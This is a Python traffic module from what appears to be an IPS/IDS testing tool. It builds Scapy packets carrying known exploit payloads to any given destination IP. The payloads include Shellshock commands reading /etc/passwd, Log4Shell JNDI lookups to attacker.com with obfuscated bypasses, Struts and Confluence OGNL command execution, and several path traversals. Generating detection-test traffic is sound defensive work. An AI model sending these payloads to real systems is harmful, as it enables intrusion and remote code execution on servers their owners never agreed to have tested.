"""Known exploit pattern traffic module."""

from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Known exploit signatures that trigger IPS detection
EXPLOIT_PATTERNS = [
    # Shellshock (CVE-2014-6271)
    {
        "name": "Shellshock",
        "header": "User-Agent",
        "payload": "() { :; }; /bin/bash -c 'cat /etc/passwd'",
    },
    {
        "name": "Shellshock-Cookie",
        "header": "Cookie",
        "payload": "() { :; }; /bin/bash -c 'id'",
    },
    # Log4Shell (CVE-2021-44228)
    {
        "name": "Log4Shell-Basic",
        "header": "X-Api-Version",
        "payload": "${jndi:ldap://attacker.com/a}",
    },
    {
        "name": "Log4Shell-Bypass1",
        "header": "User-Agent",
        "payload": "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
    },
    {
        "name": "Log4Shell-Bypass2",
        "header": "X-Forwarded-For",
        "payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
    },
    # Spring4Shell (CVE-2022-22965)
    {
        "name": "Spring4Shell",
        "header": None,
        "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
        "method": "POST",
    },
    # Apache Struts (CVE-2017-5638)
    {
        "name": "Struts-RCE",
        "header": "Content-Type",
        "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}",
    },
    # EternalBlue indicators (MS17-010)
    {
        "name": "EternalBlue-Trans2",
        "header": None,
        "payload": "SMB_COM_TRANSACTION2",
        "port": 445,
        "raw": True,
    },
    # ProxyLogon (CVE-2021-26855)
    {
        "name": "ProxyLogon",
        "header": "X-BEResource",
        "payload": "Admin@localhost:444/autodiscover/autodiscover.xml?a=~1",
    },
    # Apache Path Traversal (CVE-2021-41773)
    {
        "name": "Apache-PathTraversal",
        "header": None,
        "payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "path": True,
    },
    # Confluence OGNL (CVE-2022-26134)
    {
        "name": "Confluence-OGNL",
        "header": None,
        "payload": "/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Response',#a))}/",
        "path": True,
    },
    # F5 BIG-IP (CVE-2022-1388)
    {
        "name": "F5-BigIP-Auth-Bypass",
        "header": "X-F5-Auth-Token",
        "payload": "",
        "extra_headers": {"Connection": "X-Forwarded-Host"},
    },
    # VMware vCenter (CVE-2021-21972)
    {
        "name": "vCenter-Upload",
        "header": None,
        "payload": "/ui/vropspluginui/rest/services/uploadova",
        "path": True,
    },
    # Citrix ADC (CVE-2019-19781)
    {
        "name": "Citrix-PathTraversal",
        "header": None,
        "payload": "/vpn/../vpns/cfg/smb.conf",
        "path": True,
    },
    # PHPUnit RCE (CVE-2017-9841)
    {
        "name": "PHPUnit-RCE",
        "header": None,
        "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "path": True,
        "method": "POST",
        "body": "<?php echo md5('test'); ?>",
    },
]


class ExploitsModule(TrafficModule):
    """Traffic module for known exploit patterns.

    Generates HTTP requests containing signatures of known exploits
    to trigger IPS/IDS detection rules.
    """

    def __init__(self) -> None:
        """Initialize the exploits module."""
        self._exploit_index = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="exploits",
            description="Known exploit signatures (Shellshock, Log4Shell, etc.)",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "HTTP"],
            ports=[80, 443, 445, 8080, 8443],
        )

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate exploit signature packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with exploit signatures
        """
        # Get next exploit pattern
        exploit = EXPLOIT_PATTERNS[self._exploit_index % len(EXPLOIT_PATTERNS)]
        self._exploit_index += 1

        port = exploit.get("port", dst_port or 80)
        method = exploit.get("method", "GET")

        # Build the HTTP request
        if exploit.get("path"):
            path = exploit["payload"]
        else:
            path = "/api/test"

        # Build headers
        headers = [
            f"Host: {dst_ip}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: */*",
            "Connection: close",
        ]

        # Add exploit header if specified
        if exploit.get("header"):
            headers.append(f"{exploit['header']}: {exploit['payload']}")

        # Add extra headers if any
        if exploit.get("extra_headers"):
            for h_name, h_value in exploit["extra_headers"].items():
                headers.append(f"{h_name}: {h_value}")

        # Build request body
        body = exploit.get("body", "")
        if method == "POST" and not exploit.get("path"):
            body = exploit.get("payload", "")

        if body:
            headers.append(f"Content-Length: {len(body)}")
            headers.append("Content-Type: application/x-www-form-urlencoded")

        # Construct HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        http_request += "\r\n".join(headers)
        http_request += "\r\n\r\n"
        if body:
            http_request += body

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._exploit_index % 25000), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )

        yield packet

